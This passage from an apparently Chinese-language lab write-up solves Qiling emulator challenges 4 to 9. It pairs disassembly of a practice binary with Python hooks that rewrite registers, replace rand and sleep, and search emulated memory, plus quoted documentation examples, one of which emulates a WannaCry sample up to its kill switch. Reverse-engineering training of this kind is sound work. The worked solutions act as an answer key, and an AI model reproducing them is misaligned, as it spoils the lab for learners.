class="line">.text:0000000000000E40                               loc_E40:                                ; CODE XREF: challenge4+16↑j</span><br><span class="line">.text:0000000000000E40 8B 45 F8                      mov     eax, [rbp+var_8]</span><br><span class="line">.text:0000000000000E43 39 45 FC                      cmp     [rbp+var_4], eax</span><br><span class="line">.text:0000000000000E46 7C ED                         jl      short loc_E35</span><br><span class="line">.text:0000000000000E46</span><br><span class="line">.text:0000000000000E48 90                            nop</span><br><span class="line">.text:0000000000000E49 5D                            pop     rbp</span><br><span class="line">.text:0000000000000E4A C3                            retn</span><br><span class="line">.text:0000000000000E4A                               ; &#125; // starts at E1D</span><br><span class="line">.text:0000000000000E4A</span><br><span class="line">.text:0000000000000E4A                               challenge4 endp</span><br></pre></td></tr></table></figure><p>这里会是一个循环，我们想要的是使参数为真，而loc_E35块可以满足我们的要求，但是<code>jl      short loc_E35</code>是显然无法满足的，因为-4和-8的位置都被置为0了是相等的，而jl是小于跳转，因此要想办法跳转到loc_E35块上</p><p><strong>读寄存器</strong></p><ul><li>从字符串“eax”读取</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.read(<span class="string">&quot;EAX&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>从 Unicorn Engine const 读取</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.read(UC_X86_REG_EAX)</span><br></pre></td></tr></table></figure><ul><li>读eax</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eax = ql.arch.regs.eax</span><br></pre></td></tr></table></figure><ul><li>将 0xFF 写入“eax”</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.write(&quot;EAX&quot;, 0xFF)</span><br></pre></td></tr></table></figure><ul><li>通过 Unicorn Engine const 将 0xFF 写入 eax</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.write(UC_X86_REG_EAX, <span class="number">0xFF</span>)</span><br></pre></td></tr></table></figure><ul><li>将 0xFF 写入 eax</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.eax =  <span class="number">0xFF</span></span><br></pre></td></tr></table></figure><p>还有一些跨架构寄存器的获取方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.arch_pc</span><br><span class="line">ql.arch.regs.arch_sp  <span class="comment">#这仅适用于 PC 和 SP。</span></span><br><span class="line">ql.arch.regs.arch_pc = <span class="number">0xFF</span></span><br><span class="line">ql.arch.regs.arch_sp = <span class="number">0xFF</span>  <span class="comment">#从当前架构上的 PC/SP 读取，由 ql.arch.type 定义</span></span><br></pre></td></tr></table></figure><ul><li>获取当前arch寄存器表列表</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.register_mapping()</span><br></pre></td></tr></table></figure><ul><li>在 64 位环境中，这将返回 64</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.reg_bits(<span class="string">&quot;rax&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>在 64 位环境中，这将返回 32</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.reg_bits(<span class="string">&quot;eax&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>Hook</strong></p><p>挂钩具体地址。<strong>执行指定地址时将调用已注册的回调。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.hook_address（回调：可调用，地址：int）</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">ql: Qiling</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        ql.log.info(<span class="string">&#x27;killer switch found, stopping&#x27;</span>)</span><br><span class="line">        ql.emu_stop()</span><br><span class="line"></span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;examples/rootfs/x86_windows/bin/wannacry.bin&#x27;</span>], <span class="string">r&#x27;examples/rootfs/x86_windows&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># have &#x27;stop&#x27; called when execution reaches 0x40819a</span></span><br><span class="line">    ql.hook_address(stop, <span class="number">0x40819a</span>)</span><br><span class="line"></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>挂钩所有说明。注册的回调将在每个汇编指令执行之前调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.hook_code（回调：可调用， user_data ：任何=无）</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> Cs</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_diassembler</span>(<span class="params">ql: Qiling, address: <span class="built_in">int</span>, size: <span class="built_in">int</span>, md: Cs</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    buf = ql.mem.read(address, size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> insn <span class="keyword">in</span> md.disasm(buf, address):</span><br><span class="line">        ql.log.debug(<span class="string">f&#x27;:: <span class="subst">&#123;insn.address:#x&#125;</span> : <span class="subst">&#123;insn.mnemonic:24s&#125;</span> <span class="subst">&#123;insn.op_str&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;examples/rootfs/x8664_linux/bin/x8664_hello&#x27;</span>], <span class="string">r&#x27;examples/rootfs/x8664_linux&#x27;</span>, verbose=QL_VERBOSE.DEBUG)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># have &#x27;simple_disassembler&#x27; called on each instruction, passing a Capstone disassembler instance bound to</span></span><br><span class="line">    <span class="comment"># the underlying architecture as an optional argument</span></span><br><span class="line">    ql.hook_code(simple_diassembler, user_data=ql.arch.disassembler)</span><br><span class="line"></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>还有一些hook，例如挂钩一段代码、挂钩中断号以调用自定义函数、拦截特定类型的指令等等</p><p>我的想法是在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000E43 39 45 FC                      cmp     [rbp+var_4], eax</span><br></pre></td></tr></table></figure><p>这个地址执行前，在eax里写入1，这样就使得jl条件达成，就成功跳转到成功片段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_eax_1</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;EAX&quot;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge4</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(write_eax_1,base_addr+<span class="number">0x0E43</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge5</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">14</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">srand</span>(v1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] = <span class="number">0</span>;</span><br><span class="line">    v5[i + <span class="number">8</span>] = <span class="built_in">rand</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[j] != v5[j + <span class="number">8</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是让rand的返回值为0即可</p><p>这里不是系统调用的劫持，而是劫持libc函数，这里看个例子</p><p>与系统调用一样，POSIX libc 函数可以以类似的方式挂钩，从而允许用户控制其功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_INTERCEPT</span><br><span class="line"><span class="keyword">from</span> qiling.os.const <span class="keyword">import</span> STRING</span><br><span class="line"></span><br><span class="line"><span class="comment"># customized POSIX libc methods accept a single argument that refers to the active</span></span><br><span class="line"><span class="comment"># Qiling instance. The Qiling instance may be used to interact with various subsystems,</span></span><br><span class="line"><span class="comment"># such as the memory or registers. The customized method may or may not return a value</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_puts</span>(<span class="params">ql: Qiling</span>):</span><br><span class="line">    <span class="comment"># Qiling offers a few conviniency methods that abstract away the access to the call</span></span><br><span class="line">    <span class="comment"># parameters. specifying the arguments names and types woud allow Qiling to retrieve</span></span><br><span class="line">    <span class="comment"># their values and parse them accordingly.</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># the following call lists a single argument named &#x27;s&#x27;, whose type is &#x27;STRING&#x27;.</span></span><br><span class="line">    <span class="comment"># a dictionary will be created having the key &#x27;s&#x27; mapped to the null-terminated</span></span><br><span class="line">    <span class="comment"># string read from the memory address pointed by the first argument.</span></span><br><span class="line">    params = ql.os.resolve_fcall_params(&#123;<span class="string">&#x27;s&#x27;</span>: STRING&#125;)</span><br><span class="line"></span><br><span class="line">    s = params[<span class="string">&#x27;s&#x27;</span>]</span><br><span class="line">    ql.log.info(<span class="string">f&#x27;my_puts: got &quot;<span class="subst">&#123;s&#125;</span>&quot; as an argument&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># emulate puts functionality</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;rootfs/x8664_linux/bin/x8664_hello&#x27;</span>], <span class="string">r&#x27;rootfs/x8664_linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ql.os.set_api(<span class="string">&#x27;puts&#x27;</span>, my_puts, QL_INTERCEPT.CALL)</span><br><span class="line">    ql.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rand_rets</span>(<span class="params">ql ,*args</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge5</span>(<span class="params">ql</span>):</span><br><span class="line">ql.os.set_api(<span class="string">&#x27;rand&#x27;</span>, rand_rets)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><h3 id="challenge6"><a href="#challenge6" class="headerlink" title="challenge6"></a>challenge6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000EF6                               public challenge6</span><br><span class="line">.text:0000000000000EF6                               challenge6 proc near                    ; CODE XREF: start+1D7↓p</span><br><span class="line">.text:0000000000000EF6</span><br><span class="line">.text:0000000000000EF6                               var_18= qword ptr -18h</span><br><span class="line">.text:0000000000000EF6                               var_5= byte ptr -5</span><br><span class="line">.text:0000000000000EF6                               var_4= dword ptr -4</span><br><span class="line">.text:0000000000000EF6</span><br><span class="line">.text:0000000000000EF6                               ; __unwind &#123;</span><br><span class="line">.text:0000000000000EF6 55                            push    rbp</span><br><span class="line">.text:0000000000000EF7 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000000EFA 48 89 7D E8                   mov     [rbp+var_18], rdi</span><br><span class="line">.text:0000000000000EFE C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0</span><br><span class="line">.text:0000000000000F05 C6 45 FB 01                   mov     [rbp+var_5], 1</span><br><span class="line">.text:0000000000000F09 EB 07                         jmp     short loc_F12                   ; 零扩展</span><br><span class="line">.text:0000000000000F09</span><br><span class="line">.text:0000000000000F0B                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000F0B</span><br><span class="line">.text:0000000000000F0B                               loc_F0B:                                ; CODE XREF: challenge6+22↓j</span><br><span class="line">.text:0000000000000F0B C7 45 FC 01 00 00 00          mov     [rbp+var_4], 1</span><br><span class="line">.text:0000000000000F0B</span><br><span class="line">.text:0000000000000F12</span><br><span class="line">.text:0000000000000F12                               loc_F12:                                ; CODE XREF: challenge6+13↑j</span><br><span class="line">.text:0000000000000F12 0F B6 45 FB                   movzx   eax, [rbp+var_5]                ; 零扩展</span><br><span class="line">.text:0000000000000F16 84 C0                         test    al, al</span><br><span class="line">.text:0000000000000F18 75 F1                         jnz     short loc_F0B</span><br><span class="line">.text:0000000000000F18</span><br><span class="line">.text:0000000000000F1A 48 8B 45 E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:0000000000000F1E C6 00 01                      mov     byte ptr [rax], 1</span><br><span class="line">.text:0000000000000F21 90                            nop</span><br><span class="line">.text:0000000000000F22 5D                            pop     rbp</span><br><span class="line">.text:0000000000000F23 C3                            retn</span><br><span class="line">.text:0000000000000F23                               ; &#125; // starts at EF6</span><br><span class="line">.text:0000000000000F23</span><br><span class="line">.text:0000000000000F23                               challenge6 endp</span><br></pre></td></tr></table></figure><p>这里会有一个无限循环，<code>movzx   eax, [rbp+var_5]</code>    先eax零扩展赋值为1，之后<code>test    al, al</code>对al进行逻辑与的运算，结果存入ZF中，而jnz是ZF不为0则跳转，显然会有跳转，之后便是无限循环，我的想法 便是hook rax为0即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_0,base_addr+<span class="number">0xF16</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_0,base_addr+<span class="number">0xF16</span>)</span><br></pre></td></tr></table></figure><h3 id="challenge7"><a href="#challenge7" class="headerlink" title="challenge7"></a>challenge7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000F24                               public challenge7</span><br><span class="line">.text:0000000000000F24                               challenge7 proc near                    ; CODE XREF: start+1FB↓p</span><br><span class="line">.text:0000000000000F24</span><br><span class="line">.text:0000000000000F24                               var_8= qword ptr -8</span><br><span class="line">.text:0000000000000F24</span><br><span class="line">.text:0000000000000F24                               ; __unwind &#123;</span><br><span class="line">.text:0000000000000F24 55                            push    rbp</span><br><span class="line">.text:0000000000000F25 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000000F28 48 83 EC 10                   sub     rsp, 10h</span><br><span class="line">.text:0000000000000F2C 48 89 7D F8                   mov     [rbp+var_8], rdi</span><br><span class="line">.text:0000000000000F30 48 8B 45 F8                   mov     rax, [rbp+var_8]</span><br><span class="line">.text:0000000000000F34 C6 00 01                      mov     byte ptr [rax], 1</span><br><span class="line">.text:0000000000000F37 BF FF FF FF FF                mov     edi, 0FFFFFFFFh                 ; seconds</span><br><span class="line">.text:0000000000000F3C E8 0F FB FF FF                call    _sleep</span><br><span class="line">.text:0000000000000F3C</span><br><span class="line">.text:0000000000000F41 90                            nop</span><br><span class="line">.text:0000000000000F42 C9                            leave</span><br><span class="line">.text:0000000000000F43 C3                            retn</span><br><span class="line">.text:0000000000000F43                               ; &#125; // starts at F24</span><br><span class="line">.text:0000000000000F43</span><br><span class="line">.text:0000000000000F43                               challenge7 endp</span><br></pre></td></tr></table></figure><p>这里有两种想法，第一种便是修改rdi，在call sleep前将rdi改为0，第二种便是hook掉sleep，直接return</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_rdi_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rdi&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sleep</span>(<span class="params">ql,*args</span>):</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge7</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;sleep&#x27;, my_sleep)</span></span><br><span class="line">ql.hook_address(write_rdi_0,base_addr+<span class="number">0x00F3C</span>)</span><br></pre></td></tr></table></figure><h3 id="challenge8"><a href="#challenge8" class="headerlink" title="challenge8"></a>challenge8</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall challenge8(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // rax</span><br><span class="line">  _DWORD *v2; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = malloc(0x18uLL);</span><br><span class="line">  *(_QWORD *)v2 = malloc(0x1EuLL);</span><br><span class="line">  v2[<span class="number">2</span>] = <span class="number">0x539</span>;</span><br><span class="line">  v2[<span class="number">3</span>] = <span class="number">0x3DFCD6EA</span>;</span><br><span class="line">  strcpy(*(char **)v2, <span class="string">&quot;Random data&quot;</span>);</span><br><span class="line">  result = v2;</span><br><span class="line">  *((_QWORD *)v2 + <span class="number">2</span>) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题的target是**Unpack the struct and write at the target address.**解包结构体，然后写入目标地址</p><p>那么我的想法就是在malloc之后hook将rax返回值存入，但是我突然想到，之前我们不是刚学了如何搜索内存的吗，那么我们先通过搜索内存获得地址，然后再写入a1会不会更高端一点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">search_mem</span>(<span class="params">ql</span>):</span><br><span class="line">MAGIC=<span class="number">0x3DFCD6EA00000539</span></span><br><span class="line">struct_address = ql.mem.search(p64(MAGIC))</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> struct_address <span class="keyword">or</span> <span class="built_in">len</span>(struct_address) &lt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;struct_address is not properly initialized&quot;</span>)</span><br><span class="line">mem_value1, mem_value2 ,mem_value3 = struct.unpack(<span class="string">&quot;QQQ&quot;</span>, ql.mem.read(struct_address[<span class="number">0</span>]-<span class="number">8</span>,<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug1&quot;</span>,<span class="built_in">hex</span>(mem_value1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug2&quot;</span>,<span class="built_in">hex</span>(mem_value2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug3&quot;</span>,<span class="built_in">hex</span>(mem_value3))</span><br><span class="line">ql.mem.write(mem_value3, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge8</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(search_mem, base+<span class="number">0xFB5</span>)</span><br></pre></td></tr></table></figure><h3 id="challenge9"><a href="#challenge9" class="headerlink" title="challenge9"></a>challenge9</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge9</span><span class="params">(<span class="type">bool</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(src, <span class="string">&quot;aBcdeFghiJKlMnopqRstuVWxYz&quot;</span>);</span><br><span class="line">  src[<span class="number">27</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">for</span> ( i = dest; *i; ++i )</span><br><span 